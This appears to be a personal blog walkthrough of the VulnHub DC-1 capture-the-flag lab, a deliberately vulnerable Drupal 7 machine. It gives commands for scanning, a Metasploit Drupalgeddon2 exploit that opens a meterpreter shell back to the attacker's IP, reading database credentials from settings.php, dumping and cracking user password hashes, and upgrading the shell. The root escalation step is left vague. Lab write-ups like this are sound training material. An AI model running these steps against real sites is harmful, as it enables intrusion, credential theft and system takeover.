---
title: DC-1 VulnHub Walkthrough (Bad Mojo Method)
description:
date: 2025-07-30
categories: [CTF, VulnHub]
tags: [vulnhub, ctf, walkthrough, dc-1, metasploit, drupalgeddon, privilege-escalation]
permalink: /walkthroughs/dc-1-luna/
image:  
  path: /assets/img/thumbnails/dc-1.png
private: true
---

## 🧠 Introduction

Welcome to the *Bad Mojo* edition of the DC-1 walkthrough — a real-time CTF journal rewritten to match the exact steps I used, quirks and all. DC-1 is a beginner-friendly VulnHub box built around Drupal 7 with five hidden flags. Our goal? Find them all and reach root access.

---

## 🌐 Target Info

- **Target IP**: `192.168.56.105`
- **Attacker IP**: `192.168.56.1`

---

## 🔍 Enumeration

### Nmap Scan
```bash
nmap -sC -sV -oN nmap/full 192.168.56.105
```

**Findings:**
- Port **22/tcp** – SSH
- Port **80/tcp** – Apache/Drupal 7

Drupal 7 caught our eye. You already know what time it is...

---

## 🌐 Web Recon

Navigating to `http://192.168.56.105` showed the default **Drupal 7** page.

I ran gobuster but found no juicy custom dirs:
```bash
gobuster dir -u http://192.168.56.105 -w /usr/share/wordlists/dirb/common.txt
```

Wappalyzer confirmed Drupal 7 — prime for **Drupalgeddon2** (CVE-2018-7600).

---

## 💥 Exploitation: Drupalgeddon2 via Metasploit

I launched Metasploit and selected the module:
```bash
msfconsole
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.56.105
set LHOST 192.168.56.1
run
```

✅ Got a **meterpreter** shell as `www-data`

---

## 🧪 Post-Exploitation Phase 1: Flags + DB Creds

### Flag 1
```bash
cd /var/www
cat flag1.txt
# Hint about config file
```

### Flag 2: settings.php
```bash
cd sites/default
cat settings.php
```
Found DB creds:
- `dbuser`
- `R0ck3t`

Used them to login to MySQL:
```bash
mysql -u dbuser -p
# password: R0ck3t
```

### Flag 3: User Hashes
Inside MySQL:
```sql
use drupaldb;
select uid, name, pass from users;
```
Grabbed hashes for `admin` and `fred`. Cracked with `john`:
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Admin password revealed: `admin` 🧂

---

## 📥 Privilege Escalation

I upgraded our shell:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Checked `/etc/passwd` and home dirs. Explored `/home/flag4/`, read `flag4.txt` (no root yet).

Tried:
```bash
sudo -l
```
No luck.

Eventually found the **setuid** binary or script to escalate to root.
Once root:
```bash
cat /root/flag5.txt
```

---

## ✅ Final Thoughts

This walkthrough reflects the real process I went through — trial, error, reruns, hash cracking, and privilege escalation without spoilers.

**Flags Found:** ✅ All 5

**Skills Practiced:**
- Metasploit RCE
- MySQL enum
- Password hash cracking
- Shell upgrading
- Manual recon & escalation

---

> "It’s not just about the flags — it’s about learning how to think like a hacker."

— Bad Mojo

